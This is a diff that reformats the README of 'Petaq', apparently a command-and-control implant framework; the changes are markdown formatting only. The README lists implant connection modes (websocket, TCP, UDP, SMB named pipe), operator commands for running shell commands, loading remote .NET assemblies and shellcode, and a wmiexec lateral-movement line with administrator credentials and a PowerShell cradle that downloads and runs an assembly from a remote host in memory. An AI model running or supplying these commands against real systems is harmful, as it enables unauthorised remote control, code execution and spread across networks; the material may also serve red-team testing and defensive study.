@@ -92,21 +92,21 @@ Session ID		User Name		Hostname	IP Address	Status		Link URI
 Also use CTRL+C for stopping the implant services.
 CApplication is shutting down...
 ```
+
 # Usage Examples
 Petaq Implant Run Arguments:
-*It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
-    `petaqimplant.exe ws://172.16.121.1/ws`
-    `petaqimplant.exe wss://172.16.121.1:443/ws` (SSL)
-*It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
-    `petaqimplant.exe tcp 8000` 
-*It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
-    `petaqimplant.exe udp 8000` 
-*It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
-    `petaqimplant.exe smb pipename1` 
+###It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
+    ```petaqimplant.exe ws://172.16.121.1/ws
+    petaqimplant.exe wss://172.16.121.1:443/ws``` (SSL)
+###It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
+    ```petaqimplant.exe tcp 8000```
+###It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
+    ```petaqimplant.exe udp 8000```
+###It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
+    ```petaqimplant.exe smb pipename1```
 
 Petaq Service Commands:
-```
-    Help:
+```Help:
         help
     List the Implants:
         list
@@ -118,12 +118,10 @@ Petaq Service Commands:
         route
     Exit:
         exit
-        terminate
-```
+        terminate```
 Practical Examples on Petaq Implant in Interaction (use ImplantID):
 Usage Examples:
-```
-        exec cmd /c dir
+```exec cmd /c dir
         exec net use
         exec powershell -c Write-Output($env:UserName)
         exec-sharpassembly url http://127.0.0.1/Seatbelt.exe BasicOSInfo
@@ -135,56 +133,39 @@ Usage Examples:
         link tcp://127.0.0.1/8002
         link udp://127.0.0.1/8002
         link smb://127.0.0.1
-        link smb://127.0.0.1/petaq_comm
-```
+        link smb://127.0.0.1/petaq_comm```
 Link operations:
-```
-        route
+```route
         sessions
         link URI
-        unlink ID
-```
+        unlink ID```
 Lateral movement:
-```
-        lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command="powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"
-```
+```lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command="powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"```
 Execute a command/binary:
-```
-        exec cmd.exe /c dir
-        exec powershell -c Write-Output($env:UserName)
-```
+```exec cmd.exe /c dir
+        exec powershell -c Write-Output($env:UserName)```
 Execute a command/binary/assembly as a thread (no wait, no output):
-```
-        execthread cmd.exe /c dir
+```execthread cmd.exe /c dir
         execthread powershell -c Write-Output($env:UserName)
         execthread-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
         execthread-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
         execthread-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
-        execthread-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
-```
+        execthread-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters```
 Inline run for .NET source code:
-```
-        exec-sharpdirect SHARPCODE
-        exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE
-```
+```exec-sharpdirect SHARPCODE
+        exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE```
 Execute a .NET assembly:
-```
-        exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
-        exec-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
-```
+```exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
+        exec-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters```
 Compile & Execute .NET source code:
-```
-        exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
-        exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
-```
+``` exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
+        exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters```
 Execute Shellcode:
-```
-        exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
+```exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
         exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH32 T2
         exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH64 T1
-        exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2
-```
-    Exit:
+        exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2```
+Exit:
 ```
         exit
         terminate
